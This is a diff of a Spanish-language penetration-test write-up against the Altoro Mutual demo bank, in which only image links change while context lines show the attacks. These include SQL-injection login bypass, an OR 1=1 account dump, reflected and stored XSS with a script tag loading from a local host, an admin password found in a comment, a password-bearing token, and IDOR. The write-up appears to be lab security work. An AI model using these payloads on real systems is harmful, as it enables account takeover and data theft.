@@ -17,7 +17,7 @@ Saco los formularios del login y del buscador para ver por donde entrar.
 + <input type="submit" name="btnSubmit" value="Login">
 ```
 
-![](img/altoro-1.png)
+<img width="1043" height="227" alt="altoro-1 png" src="https://github.com/user-attachments/assets/2a536857-f737-4f39-9d1a-4d5d31c108df" />
 
 Y un barrido de rutas para ver que hay vivo.
 
@@ -49,7 +49,7 @@ Pero con el comentario de SQL entra directo, sin contraseña.
 + Location: /bank/main.jsp
 ```
 
-![](img/altoro-2.png)
+<img width="777" height="107" alt="altoro-2 png" src="https://github.com/user-attachments/assets/a71fc002-618d-4c1a-ad24-b489dd69f2ed" />
 
 Y confirmo que soy el admin.
 
@@ -69,7 +69,7 @@ Al loguearme el servidor me manda una cookie llamada `AltoroAccounts` que parece
 + 800000~Corporate~-164.0|800001~Checking~-9.9E11|800009~Checking~4.89E8
 ```
 
-![](img/altoro-3.png)
+<img width="725" height="90" alt="altoro-3 png" src="https://github.com/user-attachments/assets/1bede438-8529-42b4-83e7-e4b90a3d4ff8" />
 
 Con el `OR 1=1` me traigo todas las del banco.
 
@@ -79,7 +79,7 @@ Con el `OR 1=1` me traigo todas las del banco.
 + cuentas: 65
 ```
 
-![](img/altoro-4.png)
+<img width="465" height="162" alt="altoro-4 png" src="https://github.com/user-attachments/assets/8cefa451-dacd-4538-9d1f-dfbbc23061aa" />
 
 65 cuentas, con sus numeros, sus tipos y sus saldos. Y dos tarjetas de credito con el PAN entero, que no deberia ir en una cookie.
 
@@ -117,7 +117,7 @@ Codificado si sale.
 + <script>alert(1)</script>
 ```
 
-![](img/altoro-5.png)
+<img width="928" height="92" alt="altoro-5 png" src="https://github.com/user-attachments/assets/5e227c8f-7b91-4dd3-9212-b424378340e2" />
 
 ## xss almacenado en el nombre de la cuenta
 
@@ -131,7 +131,7 @@ Esto es mas bonito. El campo `name` de la cuenta se guarda tal cual y luego se p
 + <option value="800044" >800044 <script src=//127.0.0.1:8125/a.js></script></option>
 ```
 
-![](img/altoro-6.png)
+<img width="830" height="108" alt="altoro-6 png" src="https://github.com/user-attachments/assets/7c269d07-852d-4e89-a132-7bcf68887770" />
 
 Hay nombres que vienen de otros que pasaron por aqui antes, con sus propios scripts y sus dominios. Es un banco de pruebas compartido y se nota.
 
@@ -145,7 +145,7 @@ Voy a `/admin/login.jsp` y ahi esta. Alguien dejo la contraseña en un comentari
 + Location: /admin/admin.jsp
 ```
 
-![](img/altoro-7.png)
+<img width="847" height="97" alt="altoro-7 png" src="https://github.com/user-attachments/assets/70bdee04-c9f3-48eb-80c3-5e79c1bb6709" />
 
 ## el panel suelta usuarios y contraseñas
 
@@ -178,7 +178,7 @@ Aqui vuelvo al `/swagger` del principio. Hay una API REST documentada, con login
 + {"Authorization":"YW5OdGFYUm86WkdWdGJ6RXlNelE9OnI/axEhKWI=","success":"jsmith is now logged in"}
 ```
 
-![](img/altoro-8.png)
+<img width="1024" height="98" alt="altoro-8 png" src="https://github.com/user-attachments/assets/d33c0626-29ba-46b7-bf88-bf68d133d6a7" />
 
 ## el token lleva la contraseña dentro
 
@@ -214,7 +214,7 @@ Con el token valido pido cuentas que no son mias y me las da todas.
 + {"accountId":"800031","balance":"$0.00","credits":[...],"debits":[...]}
 ```
 
-![](img/altoro-9.png)
+<img width="930" height="91" alt="altoro-9 png" src="https://github.com/user-attachments/assets/81244f88-be42-4155-ba5d-d03180aea06d" />
 
 Prové con 800000, 800031, 800033, 800042 y 800044 y todas responden con datos que no deberia ver jsmith.
 
